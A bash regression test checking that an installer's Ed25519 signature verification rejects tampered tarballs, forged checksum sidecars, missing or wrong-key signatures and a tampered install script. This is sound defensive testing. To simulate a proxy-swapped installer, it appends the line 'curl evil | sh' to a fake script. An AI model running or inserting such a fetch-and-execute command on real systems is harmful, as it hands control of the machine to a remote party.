#!/usr/bin/env bash
# Regression test for scripts/install.sh's Ed25519 release-signature
# verification. The sha256 sidecar travels with the tarball, so only the
# signature (checked against the key embedded in install.sh) proves the bytes
# came from the release pipeline rather than from whoever controls the
# download channel.
#
# fetch_tarball() and verify_release_signature() are extracted from install.sh's
# live source; a throwaway keypair is generated per run and never committed.
#
# Exits 0 on success, 1 on any assertion failure.
set -euo pipefail

# macOS ships LibreSSL, which lacks Ed25519 -rawin; Homebrew's OpenSSL does not.
[ -d /opt/homebrew/bin ] && PATH="/opt/homebrew/bin:$PATH"

DIR="$(cd "$(dirname "$0")" && pwd)"
INSTALL="$DIR/install.sh"

PASS=0
FAIL=0

assert() {
  local label="$1" ok="$2"
  if [ "$ok" = "1" ]; then
    echo "PASS: $label"
    PASS=$(( PASS + 1 ))
  else
    echo "FAIL: $label"
    FAIL=$(( FAIL + 1 ))
  fi
}

write_runner() {
  local install_script="$1" runner="$2"
  {
    echo '#!/usr/bin/env bash'
    echo 'set -euo pipefail'
    awk '/^mktemp_disk_dir\(\) \{/,/^\}/' "$install_script"
    awk '/^verify_release_signature\(\) \{/,/^\}/' "$install_script"
    awk '/^fetch_tarball\(\) \{/,/^\}/' "$install_script"
    echo 'RELEASE_PUBKEY_PEM="$TEST_PUBKEY_PEM"'
    echo 'DOWNLOAD_DIR=""; trap '"'"'rm -rf ${DOWNLOAD_DIR:+"$DOWNLOAD_DIR"}'"'"' EXIT'
    echo 'fetch_tarball "$1"'
    echo 'echo "TARBALL_PATH=$TARBALL"'
  } > "$runner"
}

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

sign() { openssl pkeyutl -sign -rawin -inkey "$1" -in "$2" -out "$2.sig"; }

openssl genpkey -algorithm ed25519 -out "$WORK/priv.pem" 2>/dev/null
openssl pkey -in "$WORK/priv.pem" -pubout -out "$WORK/pub.pem"
openssl genpkey -algorithm ed25519 -out "$WORK/other-priv.pem" 2>/dev/null
TEST_PUBKEY_PEM="$(cat "$WORK/pub.pem")"
export TEST_PUBKEY_PEM

# make_release <dir>: a correctly signed fake release.
make_release() {
  local d="$1"
  mkdir -p "$d"
  printf 'stable fake tarball bytes\n' > "$d/rel.tar.gz"
  sha256sum "$d/rel.tar.gz" | cut -d' ' -f1 > "$d/rel.tar.gz.sha256"
  sign "$WORK/priv.pem" "$d/rel.tar.gz"
  sign "$WORK/priv.pem" "$d/rel.tar.gz.sha256"
}

run_fetch() { # runner dir -> sets STATUS, OUT
  STATUS=0
  OUT="$(bash "$1" "file://$2/rel.tar.gz" 2>&1)" || STATUS=$?
}

RUNNER="$WORK/runner.sh"
write_runner "$INSTALL" "$RUNNER"

# Good release: every real release must install, or nothing installs.
make_release "$WORK/good"
run_fetch "$RUNNER" "$WORK/good"
assert "a correctly signed release installs (a regression here would block every user)" \
  "$([ "$STATUS" -eq 0 ] && echo 1 || echo 0)"

# Tampered tarball: swapped binaries must not reach tar -xzf as root, even if
# the attacker also rewrote the sidecar to match.
make_release "$WORK/tar"
printf 'evil' >> "$WORK/tar/rel.tar.gz"
sha256sum "$WORK/tar/rel.tar.gz" | cut -d' ' -f1 > "$WORK/tar/rel.tar.gz.sha256"
run_fetch "$RUNNER" "$WORK/tar"
assert "a tampered tarball with a matching rewritten sidecar is rejected (checksum alone cannot catch a channel attacker)" \
  "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"
assert "tampered-tarball rejection names the signature failure" \
  "$(printf '%s' "$OUT" | grep -q 'signature verification FAILED' && echo 1 || echo 0)"

# Tampered sidecar.
make_release "$WORK/sha"
printf '%064d\n' 0 > "$WORK/sha/rel.tar.gz.sha256"
run_fetch "$RUNNER" "$WORK/sha"
assert "a tampered .sha256 is rejected on its own signature" \
  "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"
assert "tampered-sidecar rejection is a signature failure, not the later checksum mismatch" \
  "$(printf '%s' "$OUT" | grep -q 'signature verification FAILED' && echo 1 || echo 0)"

# Missing .sig: downgrade to an unsigned release must fail.
make_release "$WORK/nosig"
rm "$WORK/nosig/rel.tar.gz.sig"
run_fetch "$RUNNER" "$WORK/nosig"
assert "a release with no .sig is refused (otherwise stripping the signature disables verification)" \
  "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"

# Signed by a different key.
make_release "$WORK/wrongkey"
sign "$WORK/other-priv.pem" "$WORK/wrongkey/rel.tar.gz"
run_fetch "$RUNNER" "$WORK/wrongkey"
assert "a signature from a key other than the embedded one is rejected" \
  "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"

# Unset embedded key (the repo copy): must refuse, not skip.
STATUS=0
OUT="$(TEST_PUBKEY_PEM="" bash "$RUNNER" "file://$WORK/good/rel.tar.gz" 2>&1)" || STATUS=$?
assert "an install.sh with no embedded key refuses to install instead of skipping verification" \
  "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"

# install.sh itself is signed so users can verify it out of band before running
# it. Exercise the documented user-side openssl command against a fake script.
printf '#!/bin/sh\necho installed\n' > "$WORK/install.sh"
sign "$WORK/priv.pem" "$WORK/install.sh"
user_verify() { # file sig -> status
  openssl pkeyutl -verify -pubin -inkey "$WORK/pub.pem" -rawin -in "$1" -sigfile "$2" >/dev/null 2>&1
}
STATUS=0; user_verify "$WORK/install.sh" "$WORK/install.sh.sig" || STATUS=$?
assert "a correctly signed install.sh verifies (the README verify-then-run flow must work)" \
  "$([ "$STATUS" -eq 0 ] && echo 1 || echo 0)"
cp "$WORK/install.sh" "$WORK/install-tampered.sh"
printf 'curl evil | sh\n' >> "$WORK/install-tampered.sh"
STATUS=0; user_verify "$WORK/install-tampered.sh" "$WORK/install.sh.sig" || STATUS=$?
assert "a tampered install.sh fails verification (a proxy swapping the script must be detectable)" \
  "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"
STATUS=0; user_verify "$WORK/install.sh" "$WORK/missing.sig" || STATUS=$?
assert "an install.sh with no .sig fails verification (stripping the signature must not pass)" \
  "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"
sign "$WORK/other-priv.pem" "$WORK/install-tampered.sh"
STATUS=0; user_verify "$WORK/install-tampered.sh" "$WORK/install-tampered.sh.sig" || STATUS=$?
assert "an install.sh signed by a different key fails verification" \
  "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"

# The release workflow must sign and publish install.sh.sig.
WORKFLOW="$DIR/../.github/workflows/release-tarball.yaml"
assert "release workflow signs install.sh (otherwise no install.sh.sig is published and the README flow breaks)" \
  "$(grep -qE 'for f in .* install\.sh; do' "$WORKFLOW" && echo 1 || echo 0)"

# --tarball is a trusted local file (no .sig exists beside a locally built
# tarball): the help text must say so rather than imply verification.
assert "--help states --tarball is not signature-verified" \
  "$(bash "$INSTALL" --help 2>&1 | grep -q 'NOT$' && echo 1 || echo 0)"

# Mutation self-check: with verification removed the tampered cases must be
# accepted, proving the assertions above depend on it.
MUTATED="$WORK/install-mutated.sh"
sed '/-o "\$TARBALL\.sig"/d; /-o "\$checksum_file\.sig"/d; s/^  verify_release_signature "\$TARBALL" .*$/  :/; s/^  verify_release_signature "\$checksum_file" .*$/  :/' "$INSTALL" > "$MUTATED"
if diff -q "$INSTALL" "$MUTATED" > /dev/null 2>&1; then
  assert "mutation self-check: verify_release_signature call sites exist in fetch_tarball to mutate" 0
else
  MRUNNER="$WORK/runner-mutated.sh"
  write_runner "$MUTATED" "$MRUNNER"
  run_fetch "$MRUNNER" "$WORK/tar"
  assert "mutation self-check: without signature verification the tampered tarball is accepted" \
    "$([ "$STATUS" -eq 0 ] && echo 1 || echo 0)"
  run_fetch "$MRUNNER" "$WORK/nosig"
  assert "mutation self-check: without signature verification the unsigned release is accepted" \
    "$([ "$STATUS" -eq 0 ] && echo 1 || echo 0)"
fi

echo ""
echo "Results: ${PASS} passed, ${FAIL} failed"
[ "$FAIL" -eq 0 ]
